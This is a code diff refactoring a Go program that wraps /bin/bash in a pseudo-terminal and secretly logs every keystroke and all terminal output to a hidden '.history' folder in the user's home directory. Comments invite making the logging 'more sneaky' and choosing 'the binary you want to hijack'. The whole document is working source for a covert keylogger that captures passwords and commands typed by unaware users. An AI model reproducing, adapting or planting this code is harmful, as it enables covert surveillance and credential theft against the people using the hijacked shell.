@@ -2,37 +2,57 @@ package main
 
 import (
 	"fmt"
-	"golang.org/x/term"
-	"github.com/creack/pty"
 	"io"
+	"io/fs"
 	"os"
+	"os/exec"
 	"os/signal"
 	"os/user"
+	"path"
+	"path/filepath"
 	"strings"
 	"syscall"
-	"os/exec"
-	"path"
+
+	"github.com/creack/pty"
+	"golang.org/x/term"
 )
 
-func getLogNames() []string {
+var (
+	logDir  = ".history"
+	binName = "/bin/bash"
+)
+
+func getLogNames() (logFiles []string, err error) {
 	pid := os.Getpid()
-	bin := os.Args[0]
-	usr, _ := user.Current()
+	bin := filepath.Base(os.Args[0])
+	usr, err := user.Current()
+	if err != nil {
+		return
+	}
+
 	// Log to a hidden folder in the user's home directory.
 	// Can be changed to something more sneaky.
-	histDir := path.Join(usr.HomeDir, ".history")
-	os.Mkdir(histDir, 0755)
-	stdioFilename := fmt.Sprintf("%s.%d.i.log", bin, pid)
-	stdoutFilename := fmt.Sprintf("%s.%d.o.log", bin, pid)
-	return []string { path.Join(histDir, stdioFilename), path.Join(histDir, stdoutFilename) }
+	histDir := path.Join(usr.HomeDir, logDir)
+	err = os.Mkdir(histDir, 0755)
+	if err != nil {
+		switch err.(type) {
+		case *fs.PathError:
+			err = nil
+			// dir exists
+		default:
+			return
+		}
+	}
+
+	stdio := path.Join(histDir, fmt.Sprintf("%s.%d.i.log", bin, pid))
+	stdout := path.Join(histDir, fmt.Sprintf("%s.%d.o.log", bin, pid))
+	logFiles = append(logFiles, stdio, stdout)
+	return
 }
 
-func run() error {
+func run() (err error) {
 	// Create arbitrary command.
 	var c *exec.Cmd
-	// Change this depending on the binary you want to hijack.
-	binName := "/bin/bash"
-
 	if len(os.Args) > 1 {
 		c = exec.Command(binName, os.Args[1:]...)
 	} else {
@@ -42,64 +62,67 @@ func run() error {
 	// Start the command with a pty.
 	ptmx, err := pty.Start(c)
 	if err != nil {
-		return err
+		return
 	}
-
-	// Make sure to close the pty at the end.
-	defer func() { _ = ptmx.Close() }() // Best effort.
+	defer ptmx.Close()
 
 	// Handle pty size.
 	ch := make(chan os.Signal, 1)
 	signal.Notify(ch, syscall.SIGWINCH)
-	go func() {
-		for range ch {
-			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
-				//log.Printf("error resizing pty: %s", err)
-			}
+
+	go func(sigCh chan os.Signal) {
+		for range sigCh {
+			pty.InheritSize(os.Stdin, ptmx)
 		}
-	}()
+	}(ch)
+
 	ch <- syscall.SIGWINCH // Initial resize.
 
-	names := getLogNames()
+	logFiles, err := getLogNames()
+	if err != nil {
+		return
+	}
+
 	// Set stdin in raw mode.
 	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
-		return err
+		return
 	}
-	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
+	defer term.Restore(int(os.Stdin.Fd()), oldState)
 
-	f, err := os.OpenFile(names[1],
-		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	flags := os.O_APPEND | os.O_CREATE | os.O_WRONLY
+	g, err := os.OpenFile(logFiles[0], flags, 0644)
 	if err != nil {
-		return err
+		return
 	}
+	defer g.Close()
 
-	g, err := os.OpenFile(names[0],
-		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	f, err := os.OpenFile(logFiles[1], flags, 0644)
 	if err != nil {
-		return err
+		return
 	}
+	defer f.Close()
 
 	f.WriteString(strings.Join(os.Args, " ") + "\n")
-	wOutErr := io.MultiWriter(os.Stdout, f)
 	wInout := io.MultiWriter(ptmx, g)
-
-	defer f.Close()
-	defer g.Close()
+	wOutErr := io.MultiWriter(os.Stdout, f)
 
 	// Copy stdin to the pty and the pty to stdout.
 	// Note: You can attempt to unify stdio streams,
 	//       but stdout gets a copy of stdin on carriage
 	//       return, leading to double type. Hence, 2
 	//       files are required.
-	go func() { _, _ = io.Copy(wInout, os.Stdin) }()
-	_, _ = io.Copy(wOutErr, ptmx)
+	go func(wr io.Writer) {
+		io.Copy(wr, os.Stdin)
+	}(wInout)
 
-	return nil
+	io.Copy(wOutErr, ptmx)
+
+	return
 }
 
 func main() {
 	if err := run(); err != nil {
-		return
+		fmt.Println(err) //DEBUG ONLY
 	}
 }
